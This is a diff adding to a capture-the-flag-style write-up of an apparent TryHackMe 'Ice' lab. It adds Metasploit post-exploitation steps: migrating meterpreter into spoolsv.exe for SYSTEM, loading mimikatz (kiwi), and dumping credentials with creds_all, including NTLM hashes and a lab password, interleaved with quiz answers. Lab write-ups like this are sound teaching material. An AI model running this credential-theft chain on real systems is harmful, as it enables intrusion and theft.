@@ -93,14 +93,11 @@ msf5 exploit(windows/http/icecast_header) > run RHOSTS=10.10.58.222
 meterpreter >
 ```
 
-```
 3. What is the full path (starting with exploit) for the exploitation module?
-exploit/windows/http/icecast_header
+> exploit/windows/http/icecast_header
 
 4. What is the only required setting which currently is blank?
-rhosts
-
-```
+> rhosts
 
 ### Escalating Privileges
 
@@ -129,6 +126,9 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [+] 10.10.58.222 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
 [+] 10.10.58.222 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
 [+] 10.10.58.222 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable
+
+meterpreter > getuid
+Server username: Dark-PC\Dark
 
 meterpreter > getprivs
 
@@ -164,6 +164,139 @@ meterpreter >
 
 ```
 
-## Flag
+1. What's the name of the shell we have now?
+> meterpreter
 
-[Flag goes here]
+2. What user was running that Icecast process?
+> Dark
+
+3. What build of Windows is the system?
+> 7601
+
+4. What is the architecture of the process we're running?
+> x64
+
+5. What is the full path (starting with exploit/) for the first returned exploit?
+> exploit/windows/local/bypassuac_eventvwr
+
+6. What permission listed allows us to take ownership of files?
+> SeTakeOwnershipPrivilege
+
+## Looting
+
+Learn how to gather additional credentials and crack the saved hashes on the machine.
+
+Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows.
+
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+ ...
+ 1268  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+
+```
+1. In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
+> spoolsv.exe
+
+Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 
+
+```
+meterpreter > getuid
+Server username: Dark-PC\Dark
+
+meterpreter > migrate -N spoolsv.exe
+[*] Migrating from 1044 to 1268...
+[*] Migration completed successfully.
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
+2. Let's check what user we are now with the command `getuid`. What user is listed?
+> NT AUTHORITY\SYSTEM
+
+Let's load Mimikatz using `load kiwi`
+```
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > help
+...
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+meterpreter > creds_all
+msv credentials
+===============
+
+Username  Domain   LM                                NTLM                              SHA1
+--------  ------   --                                ----                              ----
+Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
+
+wdigest credentials
+===================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+DARK-PC$  WORKGROUP  (null)
+Dark      Dark-PC    Password01!
+
+tspkg credentials
+=================
+
+Username  Domain   Password
+--------  ------   --------
+Dark      Dark-PC  Password01!
+
+kerberos credentials
+====================
+
+Username  Domain     Password
+--------  ------     --------
+(null)    (null)     (null)
+Dark      Dark-PC    Password01!
+dark-pc$  WORKGROUP  (null)
+
+```
+
+3. Which command allows up to retrieve all credentials?
+> creds_all
+
+4. What is Dark's password?
+> Password01
